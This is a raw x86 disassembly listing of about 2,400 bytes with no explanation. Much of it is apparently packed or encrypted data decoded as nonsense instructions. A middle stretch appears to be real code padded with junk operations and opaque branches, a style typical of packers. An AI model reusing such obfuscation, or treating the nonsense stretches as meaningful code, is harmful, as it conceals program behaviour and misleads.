  412415:	inc    ebx
  412416:	call   0xa700:0x176a6840
  41241d:	test   DWORD PTR [ecx-0x3b918783],ecx
  412423:	sub    eax,0x6fc7cba2
  412428:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412429:	inc    esi
  41242a:	mov    BYTE PTR [edx],ch
  41242c:	call   0x27ab8424
  412431:	push   edx
  412432:	iret   
  412433:	xor    cl,cl
  412435:	cmp    dl,BYTE PTR [ebx]
  412437:	add    al,0x64
  412439:	push   es
  41243a:	push   ss
  41243b:	and    al,0xfb
  41243d:	xchg   BYTE PTR [esi+0xbec4492],ch
  412443:	stos   DWORD PTR es:[edi],eax
  412444:	mov    ch,0x9a
  412446:	test   BYTE PTR ds:0xbe7a722b,dh
  41244c:	popa   
  41244d:	push   esp
  41244e:	adc    eax,0x2b740bb2
  412453:	cmp    BYTE PTR [ebx+0x4c4b6ded],0x9c
  41245a:	xor    al,BYTE PTR [esi+esi*8+0x57]
  41245e:	popf   
  41245f:	xor    esp,eax
  412461:	inc    ecx
  412462:	push   esi
  412463:	gs inc ebp
  412465:	dec    eax
  412466:	sbb    BYTE PTR [esp+ecx*2],bh
  412469:	mov    edx,0x6302d6e
  41246e:	dec    edx
  41246f:	dec    ebx
  412470:	stos   BYTE PTR es:[edi],al
  412471:	sbb    DWORD PTR [edi-0x27],ebx
  412474:	fs or  cl,dl
  412477:	mov    esi,0x342c056f
  41247c:	mov    ebx,0x312d6942
  412481:	inc    edi
  412482:	adc    bh,BYTE PTR [eax-0x1e]
  412485:	dec    ecx
  412486:	mov    ds:0xdb2484ed,al
  41248b:	sub    bh,dh
  41248d:	xlat   BYTE PTR ds:[ebx]
  41248e:	cwde   
  41248f:	ss push ds
  412491:	adc    eax,0x59902d0f
  412496:	fst    DWORD PTR [eax-0x14]
  412499:	std    
  41249a:	adc    DWORD PTR ds:0x916b1974,0x68
  4124a1:	push   ds
  4124a2:	adc    BYTE PTR [ebp-0x239740e3],al
  4124a8:	imul   edx,DWORD PTR [ebp+0x1c83457c],0x9a53c152
  4124b2:	cmp    bh,BYTE PTR ds:0xda13e304
  4124b8:	push   es
  4124b9:	push   0xffffff94
  4124bb:	repz and al,0x6
  4124be:	arpl   ax,sp
  4124c0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4124c1:	scas   al,BYTE PTR es:[edi]
  4124c2:	or     eax,0x2e4d83b8
  4124c7:	ja     0x41247a
  4124c9:	pop    ds
  4124ca:	call   FWORD PTR [edx-0x64def592]
  4124d0:	push   es
  4124d1:	dec    esi
  4124d2:	dec    ebp
  4124d3:	cmp    BYTE PTR [esi+0xcdbc9a1],dh
  4124d9:	push   ebx
  4124da:	sbb    DWORD PTR [esi-0x711d61cd],0x9401a831
  4124e4:	int    0x6
  4124e6:	and    al,0xa2
  4124e8:	int3   
  4124e9:	jb     0x4124a5
  4124eb:	mov    ds:0xb60f400b,eax
  4124f0:	hlt    
  4124f1:	(bad)  
  4124f2:	out    dx,eax
  4124f3:	aad    0x6f
  4124f5:	sti    
  4124f6:	mov    al,ds:0xf5b93b9
  4124fb:	mov    esp,0xaa42aa94
  412500:	jge    0x412550
  412502:	xchg   ebp,eax
  412503:	mov    ch,0x47
  412505:	arpl   dx,cx
  412507:	cmp    al,0xcd
  412509:	mov    WORD PTR [ebx+ebp*2],gs
  41250c:	mov    bh,0x3f
  41250e:	mov    al,ds:0x82053073
  412513:	jmp    0x412534
  412515:	and    al,0xfc
  412517:	shl    BYTE PTR [ebx-0x42],cl
  41251a:	loope  0x412574
  41251c:	inc    ecx
  41251d:	jge    0x412588
  41251f:	retf   0xbc57
  412522:	jmp    0x9548:0x5224dc72
  412529:	jmp    0x4124ea
  41252b:	pop    esp
  41252c:	dec    edi
  41252d:	(bad)  
  41252e:	push   0x4
  412530:	(bad)  
  412531:	cmp    edi,DWORD PTR [ebp+ecx*4+0x33]
  412535:	dec    edi
  412536:	outs   dx,DWORD PTR ds:[esi]
  412537:	nop    DWORD PTR [ecx+eiz*2+0x30]
  41253c:	add    eax,0x207ce16e
  412541:	icebp  
  412542:	repz add DWORD PTR ds:0x60d7b807,esp
  412549:	cld    
  41254a:	enter  0x7e59,0x92
  41254e:	mov    ch,0x83
  412551:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412552:	jnp    0x412505
  412554:	rcr    DWORD PTR [eax-0x584f7cc8],cl
  41255a:	push   esi
  41255b:	dec    esi
  41255c:	out    0x3e,al
  41255e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41255f:	into   
  412560:	mov    ss,WORD PTR [ecx+eiz*8+0x5b7d943e]
  412567:	test   DWORD PTR [edi],ebp
  412569:	and    DWORD PTR [esi],esp
  41256b:	fld    DWORD PTR [ebx-0x4a9b32b6]
  412571:	sub    BYTE PTR [ebp-0x7c4ea947],0x17
  412578:	in     eax,dx
  412579:	jnp    0x412577
  41257b:	(bad)  
  41257c:	mov    edx,0x68788b95
  412581:	daa    
  412582:	scas   eax,DWORD PTR es:[edi]
  412583:	mov    ah,ah
  412585:	imul   ebx,DWORD PTR [edi+0x5788979],0xffffffc0
  41258c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41258d:	xchg   esp,eax
  41258e:	jbe    0x4125cf
  412590:	sub    ecx,DWORD PTR [edx-0x2722d146]
  412596:	fistp  QWORD PTR [ebx-0x1]
  412599:	dec    ebx
  41259a:	pop    ebx
  41259b:	sub    ebx,DWORD PTR [si-0x23]
  41259f:	push   0x6c
  4125a1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4125a2:	fs clc 
  4125a4:	inc    ebp
  4125a5:	cmp    BYTE PTR [ebx],al
  4125a7:	xor    BYTE PTR [esi],cl
  4125a9:	and    eax,0xbffe8688
  4125ae:	mov    eax,ds:0x8b27b631
  4125b3:	push   ss
  4125b4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125b5:	mov    al,ds:0x440241c1
  4125ba:	sbb    al,0xe8
  4125bc:	mov    ah,0xfd
  4125be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4125bf:	mov    al,ds:0x8f32c2ef
  4125c4:	sbb    bl,BYTE PTR [esi+0x2f]
  4125c7:	jnp    0x4125a9
  4125c9:	pop    WORD PTR [edx-0x3e]
  4125cd:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4125ce:	mov    ah,0x96
  4125d0:	(bad)  
  4125d1:	mov    esi,0x40b62609
  4125d6:	stc    
  4125d7:	cdq    
  4125d8:	outs   dx,DWORD PTR ds:[esi]
  4125d9:	push   ebp
  4125da:	nop
  4125db:	shl    cl,0x46
  4125de:	sbb    eax,0x4d8f4eaf
  4125e3:	inc    ecx
  4125e4:	fwait
  4125e5:	adc    eax,0x1aba7cb5
  4125ea:	cmp    BYTE PTR [edx-0x7b650149],cl
  4125f0:	mov    ecx,0x2f40ab19
  4125f5:	jno    0x412645
  4125f7:	mov    bh,0x17
  4125f9:	sub    eax,0x3675ed75
  4125fe:	dec    ecx
  4125ff:	adc    al,0x94
  412601:	add    cl,BYTE PTR [ebx+esi*2+0x75]
  412605:	push   es
  412606:	mov    ecx,0x76ba59
  41260b:	sti    
  41260c:	push   edx
  41260d:	xor    eax,DWORD PTR [edx]
  41260f:	(bad)
  412612:	shl    DWORD PTR [ebx],1
  412614:	jns    0x41268b
  412616:	test   DWORD PTR [ebx-0x513f9f35],eax
  41261c:	dec    BYTE PTR [ecx-0x2e4c20a6]
  412622:	mov    ebp,esp
  412624:	shl    BYTE PTR fs:[ecx+0x6beb02e0],1
  41262b:	adc    al,0x3b
  41262d:	inc    ebp
  41262e:	jg     0x4126a0
  412630:	jecxz  0x412653
  412632:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412633:	bound  edi,QWORD PTR [eax+edi*1-0x20]
  412637:	push   0xffffffd7
  412639:	mov    bh,0xb6
  41263b:	xor    ebx,edx
  41263d:	rcl    DWORD PTR [edi+0x32],0x13
  412641:	add    al,BYTE PTR [edi]
  412643:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412644:	test   al,0xa8
  412646:	xor    al,0xc
  412648:	(bad)  
  41264a:	pop    ebx
  41264b:	inc    ebp
  41264c:	xor    ecx,ecx
  41264e:	int    0x89
  412650:	cli    
  412651:	or     dh,BYTE PTR [esi+0x10]
  412654:	jg     0x412606
  412656:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412657:	stos   BYTE PTR es:[edi],al
  412658:	adc    BYTE PTR [edx-0x80],0xe2
  41265c:	lea    eax,[ebx+0x36]
  41265f:	imul   DWORD PTR [ecx+eiz*2+0x57ac355]
  412666:	(bad)  
  412667:	pop    ecx
  412668:	fs ins DWORD PTR es:[edi],dx
  41266a:	enter  0xce4c,0xc3
  41266e:	xor    BYTE PTR [eax-0x1ba5aed4],ah
  412674:	adc    al,0x93
  412676:	mov    esi,0x6d477c15
  41267b:	jne    0x412626
  41267d:	mov    bl,0x6
  41267f:	push   0xee0e8718
  412684:	push   0x73
  412686:	cdq    
  412687:	mov    eax,0x574608c4
  41268c:	push   esi
  41268d:	push   edi
  41268e:	xor    DWORD PTR ds:0x428555,edx
  412694:	mov    eax,DWORD PTR [ebp+0x8]
  412697:	add    ebx,DWORD PTR ds:0x428351
  41269d:	mov    ecx,DWORD PTR [ebp+0xc]
  4126a0:	and    ebx,DWORD PTR ds:0x428549
  4126a6:	shrd   eax,ecx,0x2
  4126aa:	xor    esi,DWORD PTR ds:0x428565
  4126b0:	shr    ecx,0x2
  4126b3:	mov    ecx,DWORD PTR [ebp+0x8]
  4126b6:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126bd:	not    ebx
  4126bf:	mov    edi,0x75d4
  4126c4:	mov    DWORD PTR ds:0x42855d,0x68f
  4126ce:	mov    DWORD PTR ds:0x428569,0x72ee
  4126d8:	jmp    0x412740
  4126dd:	mov    esi,DWORD PTR ds:0x428419
  4126e3:	mov    DWORD PTR ds:0x428369,0x6012
  4126ed:	cmp    DWORD PTR ds:0x4284cd,0x0
  4126f4:	jg     0x41272a
  4126fa:	push   0x1b53
  4126ff:	push   0x62ef
  412704:	call   DWORD PTR ds:0x42e008
  41270a:	and    edi,0x6509
  412710:	xor    edx,edx
  412712:	add    edx,DWORD PTR ds:0x428561
  412718:	and    edx,DWORD PTR ds:0x428501
  41271e:	mov    DWORD PTR ds:0x428561,edx
  412724:	and    edi,DWORD PTR ds:0x428351
  41272a:	adc    DWORD PTR ds:0x428339,edi
  412730:	add    DWORD PTR ds:0x428571,edi
  412736:	mov    DWORD PTR ds:0x428469,0x7a33
  412740:	mov    edx,DWORD PTR [ebp+0xc]
  412743:	cmp    DWORD PTR ds:0x428449,0x0
  41274a:	mov    DWORD PTR ds:0x428331,0x5b58
  412754:	not    ebx
  412756:	mov    DWORD PTR ds:0x42845d,0x50a2
  412760:	mov    DWORD PTR ds:0x428431,edx
  412766:	jmp    0x4127b4
  41276b:	mov    DWORD PTR ds:0x428569,0x3c96
  412775:	cmp    DWORD PTR ds:0x428449,0x0
  41277c:	jne    0x41279e
  412782:	push   0x4282b5
  412787:	push   DWORD PTR [ebp-0x1c]
  41278a:	call   DWORD PTR ds:0x42e0cc
  412790:	and    DWORD PTR ds:0x428431,edi
  412796:	neg    DWORD PTR ds:0x428345
  41279c:	not    edi
  41279e:	sbb    DWORD PTR ds:0x42836d,edx
  4127a4:	sub    edi,ebx
  4127a6:	or     DWORD PTR ds:0x428449,ebx
  4127ac:	xor    esi,esi
  4127ae:	or     DWORD PTR ds:0x428335,ecx
  4127b4:	xor    edx,edx
  4127b6:	mov    esi,0x32de6d5d
  4127bb:	sub    DWORD PTR ds:0x42835d,ecx
  4127c1:	xor    eax,esi
  4127c3:	or     eax,edx
  4127c5:	mov    DWORD PTR [ebp-0x34],eax
  4127c8:	cmp    DWORD PTR ds:0x428449,0x0
  4127cf:	not    ebx
  4127d1:	mov    edx,0x6453
  4127d6:	mov    ebx,DWORD PTR ds:0x42846d
  4127dc:	mov    edi,DWORD PTR ds:0x42835d
  4127e2:	jmp    0x412823
  4127e7:	mov    edi,0x4ae9
  4127ec:	cmp    DWORD PTR ds:0x428449,0x0
  4127f3:	jbe    0x41280b
  4127f9:	push   0x428369
  4127fe:	call   DWORD PTR ds:0x42e254
  412804:	and    ebx,DWORD PTR ds:0x428425
  41280a:	inc    edx
  41280b:	adc    edx,0x18bc
  412811:	mov    ebx,DWORD PTR ds:0x4284e9
  412817:	or     ebx,DWORD PTR ds:0x428441
  41281d:	mov    DWORD PTR ds:0x4284e9,ebx
  412823:	mov    eax,DWORD PTR [ebp+0x8]
  412826:	shl    ecx,0x1e
  412829:	mov    ecx,DWORD PTR [ebp+0xc]
  41282c:	shrd   eax,ecx,0x2
  412830:	xor    eax,esi
  412832:	add    DWORD PTR ds:0x428439,0x71c1
  41283c:	shr    ecx,0x2
  41283f:	cmp    DWORD PTR ds:0x4284f9,0x0
  412846:	mov    DWORD PTR ds:0x428421,0x17f6
  412850:	mov    DWORD PTR ds:0x428425,ecx
  412856:	jmp    0x41291d
  41285b:	movzx  ecx,WORD PTR ds:0x4284dd
  412862:	cmp    DWORD PTR ds:0x4284f9,0x0
  412869:	jl     0x412892
  41286f:	push   DWORD PTR [ebp-0x10]
  412872:	call   DWORD PTR ds:0x42e0d0
  412878:	sub    DWORD PTR ds:0x42841d,edi
  41287e:	xor    edx,edx
  412880:	or     edx,DWORD PTR ds:0x4283c5
  412886:	mov    edi,DWORD PTR ds:0x428525
  41288c:	sub    edx,edi
  41288e:	sub    edx,DWORD PTR [edx+edi*1]
  412891:	inc    edx
  412892:	inc    edx
  412893:	or     DWORD PTR ds:0x4284c5,0x781a
  41289d:	adc    edi,DWORD PTR ds:0x428555
  4128a3:	sbb    ebx,DWORD PTR ds:0x428565
  4128a9:	cmp    DWORD PTR ds:0x428469,0x0
  4128b0:	mov    DWORD PTR ds:0x4284f5,0x3519
  4128ba:	mov    DWORD PTR ds:0x42856d,edx
  4128c0:	jmp    0x41291d
  4128c5:	mov    edi,DWORD PTR ds:0x428445
  4128cb:	mov    DWORD PTR ds:0x428361,0x6a8c
  4128d5:	cmp    DWORD PTR ds:0x428469,0x0
  4128dc:	jae    0x412909
  4128e2:	push   0x74d4
  4128e7:	push   DWORD PTR [ebp-0x24]
  4128ea:	call   DWORD PTR ds:0x42e00c
  4128f0:	xor    ecx,ecx
  4128f2:	or     ecx,DWORD PTR ds:0x4284b1
  4128f8:	mov    edi,DWORD PTR ds:0x4285bd
  4128fe:	sub    ecx,edi
  412900:	add    ecx,DWORD PTR [ecx+edi*1]
  412903:	xor    DWORD PTR ds:0x428549,ebx
  412909:	add    DWORD PTR ds:0x42855d,edx
  41290f:	sub    edi,DWORD PTR ds:0x4284f9
  412915:	neg    edx
  412917:	sub    ecx,DWORD PTR ds:0x428559
  41291d:	mov    ecx,DWORD PTR [ebp+0x8]
  412920:	cmp    DWORD PTR ds:0x428561,0x0
  412927:	movzx  edx,BYTE PTR ds:0x428411
  41292e:	mov    edi,DWORD PTR ds:0x428451
  412934:	jmp    0x41298c
  412939:	mov    DWORD PTR ds:0x4284ed,0x3a54
  412943:	mov    DWORD PTR ds:0x428345,0x35a1
  41294d:	cmp    DWORD PTR ds:0x428561,0x0
  412954:	jbe    0x412981
  41295a:	push   0x731e
  41295f:	push   DWORD PTR [ebp-0x1c]
  412962:	push   0x5d33
  412967:	push   DWORD PTR [ebp-0x28]
  41296a:	push   DWORD PTR [ebp-0x20]
  41296d:	call   DWORD PTR ds:0x42e0d4
  412973:	and    edx,edi
  412975:	and    DWORD PTR ds:0x4284e5,ebx
  41297b:	sbb    edi,0x47ca
  412981:	inc    edx
  412982:	add    DWORD PTR ds:0x428345,0x615e
  41298c:	mov    edx,DWORD PTR [ebp+0xc]
  41298f:	xor    ebx,ebx
  412991:	add    ebx,DWORD PTR ds:0x428391
  412997:	mov    edi,DWORD PTR ds:0x42858d
  41299d:	sub    edi,ebx
  41299f:	or     ebx,DWORD PTR [ebx+edi*1]
  4129a2:	xor    edx,edx
  4129a4:	xor    DWORD PTR ds:0x428469,ebx
  4129aa:	or     eax,edx
  4129ac:	adc    edx,0x4918
  4129b2:	mov    DWORD PTR [ebp-0x34],eax
  4129b5:	sub    ebx,edx
  4129b7:	mov    eax,ds:0x422588
  4129bc:	mov    eax,DWORD PTR [eax]
  4129be:	mov    DWORD PTR [ebp-0x28],eax
  4129c1:	mov    eax,ds:0x4227a8
  4129c6:	mov    eax,DWORD PTR [eax]
  4129c8:	xor    edx,edx
  4129ca:	mov    DWORD PTR [ebp-0x20],eax
  4129cd:	mov    ebx,DWORD PTR ds:0x42849d
  4129d3:	mov    ebx,DWORD PTR [ebx]
  4129d5:	sub    DWORD PTR ds:0x4284dd,ebx
  4129db:	mov    eax,DWORD PTR [ebp-0x28]
  4129de:	mov    eax,DWORD PTR [ebp-0x28]
  4129e1:	xor    edx,edx
  4129e3:	mov    ebx,DWORD PTR [ebp+0x8]
  4129e6:	movzx  edx,BYTE PTR ds:0x4284d5
  4129ed:	sbb    DWORD PTR ds:0x428361,edx
  4129f3:	shl    ecx,0x1e
  4129f6:	mov    edi,DWORD PTR ds:0x42833d
  4129fc:	adc    DWORD PTR ds:0x428375,edi
  412a02:	xor    ecx,ecx
  412a04:	and    DWORD PTR ds:0x428335,ecx
  412a0a:	shld   ecx,eax,0x2
  412a0e:	jmp    0x412d47
  412a13:	scas   eax,DWORD PTR es:[edi]
  412a14:	cdq    
  412a15:	and    esp,ecx
  412a17:	sub    edi,DWORD PTR [eax+esi*4-0x64]
  412a1b:	push   ecx
  412a1c:	mov    edx,0x6d6290d1
  412a21:	outs   dx,BYTE PTR ds:[esi]
  412a22:	fstp   QWORD PTR [edx+esi*2-0x42]
  412a26:	mov    esi,0xbebec4ed
  412a2b:	xchg   BYTE PTR [esi+0x79f58a8b],dh
  412a31:	je     0x4129c0
  412a33:	outs   dx,DWORD PTR ds:[esi]
  412a34:	aas    
  412a35:	cli    
  412a36:	into   
  412a37:	test   eax,0xdf306aa2
  412a3c:	jae    0x412a64
  412a3e:	sbb    edx,ebx
  412a40:	and    edx,esp
  412a42:	lods   al,BYTE PTR ds:[esi]
  412a43:	xchg   ecx,eax
  412a44:	std    
  412a45:	scas   al,BYTE PTR es:[edi]
  412a46:	pop    es
  412a47:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412a48:	loope  0x412ab6
  412a4a:	and    edi,edx
  412a4c:	add    BYTE PTR [edx],bh
  412a4e:	clc    
  412a4f:	inc    edi
  412a50:	pusha  
  412a51:	add    eax,0x6fb94e23
  412a56:	mov    al,ds:0x55931fb9
  412a5b:	stos   BYTE PTR es:[edi],al
  412a5c:	dec    edx
  412a5d:	add    dh,BYTE PTR [edx+0x7f]
  412a60:	aam    0xce
  412a62:	ret    
  412a63:	cmc    
  412a64:	adc    BYTE PTR [ecx+0x39],cl
  412a67:	outs   dx,BYTE PTR ds:[esi]
  412a68:	(bad)  
  412a69:	and    esi,esp
  412a6b:	mov    ch,0x15
  412a6d:	xor    al,0xbe
  412a6f:	pop    ebp
  412a70:	jne    0xc0019c3a
  412a76:	sub    edx,edx
  412a78:	out    dx,eax
  412a79:	icebp  
  412a7a:	dec    eax
  412a7b:	dec    ecx
  412a7c:	popf   
  412a7d:	cmp    BYTE PTR [edx-0x62],dl
  412a80:	push   DWORD PTR [ecx]
  412a82:	rol    BYTE PTR [ebp-0x10],1
  412a85:	test   BYTE PTR [edx],cl
  412a87:	fcomp  DWORD PTR ss:[edi-0x36]
  412a8b:	sbb    esp,edx
  412a8d:	or     al,0x61
  412a8f:	fwait
  412a90:	movd   DWORD PTR [ecx],mm7
  412a93:	jge    0x412a75
  412a95:	test   DWORD PTR [eax],0xf9d971c9
  412a9b:	imul   esi,edx,0xe67b819c
  412aa1:	pusha  
  412aa2:	push   edi
  412aa3:	mov    edi,0x99728fcc
  412aa8:	fs retf 
  412aaa:	xchg   ecx,eax
  412aab:	inc    ebp
  412aac:	imul   ecx,DWORD PTR [ecx+0x5dcb3582],0x3f
  412ab3:	add    BYTE PTR [edi+0x6673cdd6],ah
  412ab9:	sub    DWORD PTR [eax-0x7d],ecx
  412abc:	sbb    edi,0xffffffc5
  412abf:	add    dh,BYTE PTR cs:[ebx+0x2c520e06]
  412ac6:	rcl    edi,0x4c
  412ac9:	xchg   ebp,eax
  412aca:	in     al,0x7a
  412acc:	aam    0x2d
  412ace:	lahf   
  412acf:	push   esi
  412ad0:	fmul   QWORD PTR [eax-0x64eaba41]
  412ad6:	lahf   
  412ad7:	inc    sp
  412ad9:	imul   edx,DWORD PTR [eax],0x60e92197
  412adf:	xlat   BYTE PTR ds:[ebx]
  412ae0:	addr16 (bad) 
  412ae2:	cmc    
  412ae3:	les    edi,FWORD PTR [ebp+0x41]
  412ae6:	sub    BYTE PTR [eax],al
  412ae8:	test   al,0x31
  412aea:	add    esi,edx
  412aec:	ins    DWORD PTR es:[edi],dx
  412aed:	dec    esp
  412aee:	xchg   edx,eax
  412aef:	sub    al,0xb5
  412af1:	hlt    
  412af2:	iret   
  412af3:	scas   eax,DWORD PTR es:[edi]
  412af4:	out    dx,eax
  412af5:	std    
  412af6:	jne    0x412b3a
  412af8:	jp     0x412b02
  412afa:	cld    
  412afb:	and    BYTE PTR [ebp-0x79c2e656],0x4e
  412b02:	inc    eax
  412b03:	mov    esp,0xd3be626
  412b08:	push   edi
  412b09:	pusha  
  412b0a:	pusha  
  412b0b:	rcl    BYTE PTR [ebx],1
  412b0d:	repnz push eax
  412b0f:	(bad)  [ecx-0x62]
  412b12:	xor    al,0x93
  412b14:	or     esi,ebx
  412b16:	sbb    DWORD PTR [edx+0x47],ebx
  412b19:	mov    bl,BYTE PTR [ecx+0x56]
  412b1c:	xor    al,0x80
  412b1e:	fs out 0xc7,al
  412b21:	fcom   QWORD PTR [ecx+0x578e7d32]
  412b27:	inc    ebp
  412b28:	(bad)  
  412b29:	sbb    eax,0x89fbaf5d
  412b2e:	mov    ecx,0x69ffc501
  412b33:	xor    eax,0xce97466a
  412b38:	add    dl,BYTE PTR [ecx-0x4affca5b]
  412b3e:	add    bl,BYTE PTR [ebx-0x25fdd052]
  412b44:	cmp    esp,DWORD PTR [ebp+0x61]
  412b47:	sbb    DWORD PTR ds:0x98a75195,edi
  412b4d:	cdq    
  412b4e:	stos   BYTE PTR es:[edi],al
  412b4f:	dec    eax
  412b50:	test   al,0x78
  412b52:	lods   eax,DWORD PTR ds:[esi]
  412b53:	xchg   edi,eax
  412b54:	sbb    DWORD PTR [ecx+0x2d],ebx
  412b57:	add    ecx,ebp
  412b59:	sub    eax,0xa27b4efd
  412b5e:	push   ecx
  412b5f:	(bad)  
  412b60:	in     eax,0xe8
  412b62:	cmc    
  412b63:	in     eax,0xb6
  412b65:	add    BYTE PTR [ecx+0x13721b14],ah
  412b6b:	cmp    ch,BYTE PTR [edi]
  412b6d:	xchg   DWORD PTR [eax],ecx
  412b6f:	mov    esi,0x62653db9
  412b74:	aad    0x11
  412b76:	mov    gs,WORD PTR [ebp+0x2c9f1be0]
  412b7c:	rcr    esp,1
  412b7e:	jge    0x412bf2
  412b80:	mov    al,ds:0x66d4a5bd
  412b85:	outs   dx,DWORD PTR ds:[esi]
  412b86:	jno    0x412b58
  412b88:	and    al,0x3d
  412b8a:	sub    ah,0xa1
  412b8d:	rol    DWORD PTR [ecx-0x1742a34f],cl
  412b93:	xchg   ecx,eax
  412b94:	inc    ecx
  412b95:	cmp    al,0xa2
  412b97:	mov    eax,ds:0x8f42ef31
  412b9c:	es sbb bh,bl
  412b9f:	fnsave [edi]
  412ba1:	inc    ebp
  412ba2:	jb     0x412baa
  412ba4:	out    0xd,al
  412ba6:	and    eax,0x7545374d
  412bab:	outs   dx,DWORD PTR ds:[esi]
  412bac:	xor    al,0x95
  412bae:	mov    ah,ah
  412bb0:	jo     0x412bea
  412bb2:	xchg   ebx,eax
  412bb3:	int3   
  412bb4:	xor    edi,DWORD PTR [ecx+ecx*4]
  412bb7:	jle    0x412bf6
  412bb9:	and    eax,0xf9473e1d
  412bbe:	shl    ch,cl
  412bc0:	pop    ecx
  412bc1:	shr    BYTE PTR [ebp+0x1248cc0e],0x85
  412bc8:	inc    esp
  412bc9:	mov    al,ds:0xb84e39a5
  412bce:	sub    al,0xb7
  412bd0:	into   
  412bd1:	mov    eax,0xccffb2db
  412bd6:	clc    
  412bd7:	pop    edx
  412bd8:	test   al,0x8b
  412bda:	sub    al,0x24
  412bdc:	cmp    eax,0x82dff525
  412be1:	add    dh,cl
  412be3:	mov    ebx,0xfe664616
  412be8:	push   eax
  412be9:	je     0x412c69
  412beb:	mov    eax,0xdd8a54e4
  412bf0:	mov    ebx,0x69ebe33
  412bf5:	cmp    DWORD PTR [ecx+0x41889e28],esp
  412bfb:	pushf  
  412bfc:	ret    0xd02
  412bff:	shl    BYTE PTR [eax],1
  412c01:	mov    ds:0x38ed61cb,al
  412c06:	fidiv  WORD PTR [ebx]
  412c08:	scas   al,BYTE PTR es:[edi]
  412c09:	inc    ecx
  412c0a:	push   edi
  412c0b:	jecxz  0x412c0e
  412c0d:	pop    ebp
  412c0e:	xchg   DWORD PTR [ecx+0x72],esi
  412c11:	mov    eax,0xef72d14c
  412c16:	stos   BYTE PTR es:[edi],al
  412c17:	jno    0x412c11
  412c19:	inc    ebp
  412c1a:	lock es mov ch,0x67
  412c1e:	ficomp WORD PTR [ebx-0x48d5799b]
  412c24:	popf   
  412c25:	mov    ebx,0xf961cea4
  412c2a:	out    dx,eax
  412c2b:	and    al,0xfb
  412c2d:	cmc    
  412c2e:	add    al,0xec
  412c30:	sti    
  412c31:	and    bh,BYTE PTR [edx]
  412c33:	inc    esi
  412c34:	scas   al,BYTE PTR es:[edi]
  412c35:	add    cl,ah
  412c37:	aad    0xe0
  412c39:	fidiv  DWORD PTR [ebx-0x4ba16aec]
  412c3f:	or     BYTE PTR [ebx-0x16f6316a],al
  412c45:	(bad)  
  412c46:	mov    DWORD PTR [edi-0x7c709a26],edi
  412c4c:	xor    BYTE PTR [ecx+0x644f7cb1],0xb6
  412c53:	push   edi
  412c54:	lock dec eax
  412c56:	mov    fs,WORD PTR ds:0x9a67e48
  412c5c:	ror    BYTE PTR [esi*4-0x2ceb9805],0x58
  412c64:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412c65:	pop    ss
  412c66:	mov    fs,WORD PTR [ecx+0xe]
  412c69:	jae    0x412c23
  412c6b:	arpl   WORD PTR [ebx],si
  412c6d:	mov    al,ds:0x2f5f84a6
  412c72:	lahf   
  412c73:	xchg   ecx,eax
  412c74:	sub    eax,0x471e67de
  412c79:	pushf  
  412c7a:	push   ds
  412c7b:	fiadd  DWORD PTR [edx+0x36]
  412c7e:	popa   
  412c7f:	push   edx
  412c80:	or     DWORD PTR [esi],0x60
  412c83:	push   esi
  412c84:	(bad)  
  412c85:	push   ds
  412c86:	mov    ds:0xbc38b4cb,al
  412c8b:	(bad)  
  412c8c:	mov    ecx,0xa1429d70
  412c91:	stos   BYTE PTR es:[edi],al
  412c92:	xor    dl,bl
  412c94:	pop    edx
  412c95:	ins    DWORD PTR es:[edi],dx
  412c96:	mov    ebx,0xc0bd8ab9
  412c9b:	mov    edi,0x26ceff4b
  412ca0:	add    eax,0x5781663c
  412ca5:	cmp    DWORD PTR [ebp+esi*8+0x28],ebp
  412ca9:	call   0x22310f75
  412cae:	(bad)  
  412caf:	jmp    0x412cea
  412cb1:	jns    0x412cdd
  412cb3:	scas   al,BYTE PTR es:[edi]
  412cb4:	or     DWORD PTR [esi],esp
  412cb6:	sub    DWORD PTR [ecx+0x42],edx
  412cb9:	mov    eax,0x2a5e668d
  412cbe:	icebp  
  412cbf:	pusha  
  412cc0:	inc    ecx
  412cc1:	cdq    
  412cc2:	in     al,0x5c
  412cc4:	jecxz  0x412d1f
  412cc6:	mov    eax,ds:0xbd8a528d
  412ccb:	or     dh,ch
  412ccd:	imul   esi,ecx,0xffffffc7
  412cd0:	outs   dx,DWORD PTR ds:[esi]
  412cd1:	xor    esp,DWORD PTR [ecx-0x505faf52]
  412cd7:	daa    
  412cd8:	xchg   ecx,eax
  412cd9:	adc    al,0xbc
  412cdb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412cdc:	cld    
  412cdd:	xchg   edx,eax
  412cde:	arpl   WORD PTR [ecx],di
  412ce0:	mov    al,0x4c
  412ce2:	xchg   DWORD PTR [ebp+0x12a2b9fb],edx
  412ce8:	mov    eax,0xc53651bd
  412ced:	pop    ds
  412cee:	ficomp DWORD PTR [edx+ecx*4]
  412cf1:	shl    DWORD PTR [eax-0x34],cl
  412cf4:	pusha  
  412cf5:	xchg   edi,eax
  412cf6:	inc    eax
  412cf7:	dec    esp
  412cf8:	shl    DWORD PTR [eax],1
  412cfa:	mov    al,ds:0xbacebf16
  412cff:	rcl    edx,cl
  412d01:	lds    esp,FWORD PTR [ebx+0x7]
  412d04:	sub    DWORD PTR cs:[esi+0x3e62280b],0xaf12608b
  412d0f:	cli    
  412d10:	jb     0x412d51
  412d12:	mov    ebp,0x3d00f4c7
  412d17:	adc    eax,0xd024785a
  412d1c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  412d1d:	scas   al,BYTE PTR es:[edi]
  412d1e:	cmp    DWORD PTR [ebp-0x16],esp
  412d21:	add    eax,edi
  412d23:	out    dx,al
  412d24:	mov    al,0x17
  412d26:	pop    esp
  412d27:	inc    ecx
  412d28:	lock int 0xb1
  412d2b:	add    BYTE PTR ds:0x7b67691b,dl
  412d31:	push   es
